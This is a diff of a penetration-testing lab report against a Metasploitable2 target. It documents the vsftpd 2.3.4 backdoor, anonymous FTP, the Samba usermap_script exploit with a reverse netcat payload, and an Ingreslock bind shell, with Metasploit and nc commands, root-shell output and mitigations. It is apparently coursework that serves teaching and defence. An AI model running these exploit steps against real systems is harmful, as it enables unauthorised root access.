+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery (attempted — not confirmed)
+  - Reconnaissance: Confirmed the target is vulnerable via the IRC-based detection check, on both attempts.
+  - Delivery: The backdoor trigger string was sent to the service twice.
+- **Outcome / Impact — ⚠️ Not confirmed.** Both runs detected the vulnerability but neither produced a session.
+
+---
+
+## Exploit 7: vsftpd 2.3.4 Backdoor
 
 - **Service / Port:** FTP / 21
-- **Vulnerability:** Weak / Predictable User Credentials & Lack of Account Lockout
-- **Tool Used:** Hydra & `ftp` client
-- **Why This Tool:** Hydra is a fast, parallelized network logon attack tool capable of performing dictionary brute-force attacks against FTP authentication services.
+- **Vulnerability:** CVE-2011-2523 — a malicious backdoor inserted into the vsftpd 2.3.4 source, triggered by a `:)` smiley-face sequence in the username
+- **Tool Used:** `exploit/unix/ftp/vsftpd_234_backdoor`
+- **Why This Tool:** The trigger condition is a specific malformed username string followed by catching a listener the backdoor opens on port 6200 — the module automates sending the trigger and connecting to the resulting listener in one step.
 - **Steps:**
-  1. Identify target IP and service running on port 21.
-  2. Execute Hydra targeting the FTP service with user and password wordlists:
-     ```bash
-     hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://192.168.1.3
-     ```
-  3. Review Hydra output to locate valid credentials (e.g., `msfadmin:msfadmin` or `user:user`).
-  4. Authenticate to the remote FTP server using the recovered credentials:
-     ```bash
-     ftp 192.168.1.3
-     ```
-  5. Enter the discovered username and password at the prompts.
-  6. Verify successful logon and list directory contents:
-     ```ftp
-     ls -la
-     ```
-- **Evidence:** /home/kali/evidence/exploit_ftp _via_hydra.png
+  1. `use exploit/unix/ftp/vsftpd_234_backdoor`
+  2. `set RHOSTS 192.168.1.3`
+  3. `set LHOST 192.168.1.4`
+  4. `run` → started reverse TCP handler, ran the automatic vulnerability check, FTP banner confirmed vsFTPd 2.3.4, backdoor detected, **Meterpreter session 1 opened**.
+- **Evidence:** `evidence/exploit7.jpg`
+- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Installation, C2
+  - Reconnaissance: Automatic FTP banner check confirming the vulnerable version.
+  - Delivery: Sending the malformed username containing the trigger.
+  - Exploitation/Installation: The backdoor listener spawned and was caught.
+  - C2: The resulting Meterpreter session.
+- **Outcome / Impact:** Full root-level Meterpreter session — the most complete compromise among all 10 exploits.
+
+---
+
+## Exploit 8: Anonymous FTP
+
+- **Service / Port:** FTP / 21
+- **Vulnerability:** Anonymous login permitted with no restrictions
+- **Tool Used:** Standard `ftp` client
+- **Why This Tool:** No exploit module is needed — this is a direct configuration weakness. A plain FTP client is the correct tool because it demonstrates the issue exactly as a casual/unauthenticated user would encounter it.
+- **Steps:**
+  1. `ftp 192.168.1.3`
+  2. Username: `anonymous` → prompted for password
+  3. Password: (blank) → `230 Login successful.`
+  4. `ls` → directory listing returned.
+- **Evidence:** `evidence/exploit8.jpg`
 - **Cyber Kill Chain Stage(s):** Reconnaissance, Exploitation, Actions on Objectives
-  - *Reconnaissance:* Scanning TCP Port 21 to identify the active FTP service.
-  - *Exploitation:* Running Hydra dictionary attacks to brute-force valid account credentials.
-  - *Actions on Objectives:* Logging into the target FTP server to view, upload, or extract remote files.
-- **Outcome / Impact:** Discovered valid user credentials on the target FTP server, enabling remote unauthenticated file retrieval and upload capabilities.
+  - Reconnaissance: Confirming the FTP banner and that anonymous login is accepted.
+  - Exploitation: Logging in without valid credentials.
+  - Actions on Objectives: Enumerating the remote directory structure.
+- **Outcome / Impact:** Unauthenticated read access to the FTP root directory.
+
+---
+
+## Exploit 9: Samba usermap_script
+
+- **Service / Port:** SMB / 139
+- **Vulnerability:** CVE-2007-2447 — the Samba `usermap script` configuration option passes the username field to a shell without sanitization
+- **Tool Used:** `exploit/multi/samba/usermap_script`
+- **Why This Tool:** The vulnerability is in how Samba handles a specific config option, so exploitation means injecting shell metacharacters into the username field during authentication — the module builds and sends that crafted authentication request directly.
+- **Steps:**
+  1. `use exploit/multi/samba/usermap_script`
+  2. `set RHOSTS 192.168.1.3`
+  3. `set PAYLOAD cmd/unix/reverse_netcat`
+  4. `run` → started reverse TCP handler, **Command shell session 3 opened**.
+  5. `whoami` → `root`
+  6. `id` → `uid=0(root) gid=0(root)`
+- **Evidence:** `evidence/exploit9.jpg`
+- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
+  - Delivery: The crafted SMB authentication request containing the shell metacharacters.
+  - Exploitation: The injected command executed as root.
+  - C2: The resulting command shell session.
+- **Outcome / Impact:** Direct root shell with no credentials required at all.
+
+---
+
+## Exploit 10: Ingreslock Bind Shell
+
+- **Service / Port:** Ingreslock / 1524
+- **Vulnerability:** Pre-existing open root bind shell left listening on this port (a known artifact of a prior compromise baked into the Metasploitable2 image)
+- **Tool Used:** `nc` (Netcat)
+- **Why This Tool:** No exploitation is actually required — the port already has a root shell bound and listening with no authentication. Netcat is the right tool because it does nothing but open a raw TCP connection, which is all that's needed to pick up the shell.
+- **Steps:**
+  1. `nc 192.168.1.3 1524`
+  2. `whoami` → `root`
+  3. `id` → `uid=0(root) gid=0(root)`
+  4. `exit` to close the connection.
+- **Evidence:** `evidence/exploit10.jpg`
+- **Cyber Kill Chain Stage(s):** Delivery, Exploitation, C2
+  - Delivery: The raw TCP connection to the open port.
+  - Exploitation: Arguably none needed — the misconfiguration itself is the "exploit".
+  - C2: Direct interactive access to the pre-existing root shell.
+- **Outcome / Impact:** Instant, unauthenticated root shell — the simplest and fastest compromise of all 10.
 
 ---
 
@@ -667,16 +253,25 @@ PORT   STATE SERVICE VERSION
 
 | Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
 |---|---|---|---|---|---|---|---|
-| FTP Hydra Brute Force | ✓ | | ✓ | ✓ | | | ✓ |
+| 1. NFS Unrestricted Share | ✔ | | ✔ | | | | ✔ |
+| 2. VNC Weak Password | ✔ | ✔ | ✔ | ✔ | | | ✔ |
+| 3. Tomcat Manager Default Login ⚠️ | | | ✔ | (attempted) | | | |
+| 4. PostgreSQL Payload Execution | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
+| 5. DistCC Command Execution | | ✔ | ✔ | ✔ | | ✔ | |
+| 6. UnrealIRCd Backdoor ⚠️ | ✔ | | ✔ | (attempted) | | | |
+| 7. vsftpd 2.3.4 Backdoor | ✔ | | ✔ | ✔ | ✔ | ✔ | |
+| 8. Anonymous FTP | ✔ | | | ✔ | | | ✔ |
+| 9. Samba usermap_script | | | ✔ | ✔ | | ✔ | |
+| 10. Ingreslock Bind Shell | | | ✔ | ✔ | | ✔ | |
+
+⚠️ = exploit attempted but no session confirmed in the evidence captured — see notes above.
 
 ---
 
 ## Lessons Learned / Mitigations
 
-1. **Enforce Strong Password Policies:** Ensure all FTP user accounts utilize complex passwords that resist dictionary brute-force attacks.
-2. **Implement Rate Limiting & Account Lockouts:** Use tools like `fail2ban` to block IP addresses after multiple failed login attempts.
-3. **Use Secure Protocols:** Migrate from unencrypted FTP to secure file transfer mechanisms like SFTP (SSH File Transfer Protocol) or FTPS.
-
-```
-
--
+- **NFS Unrestricted Share:** Restrict `/etc/exports` to specific trusted host IPs/subnets, never export `/` or sensitive paths, and enable `root_squash` to prevent remote root mapping.
+- **VNC Weak Password:** Set a strong, unique VNC password (or disable password auth entirely in favor of SSH tunneling), and don't expose VNC directly to any untrusted network.
+- **vsftpd 2.3.4 Backdoor:** Never deploy a version known to be backdoored — verify package checksums/signatures, keep FTP daemons patched, and monitor for unexpected listeners (e.g. port 6200).
+- **Samba usermap_script:** Upgrade past the vulnerable Samba version (CVE-2007-2447) and remove the `usermap script` option from `smb.conf` entirely if not strictly required.
+- **Ingreslock Bind Shell:** Audit for and remove any unused/legacy services; a root shell bound with no authentication should never exist, let alone ship by default.
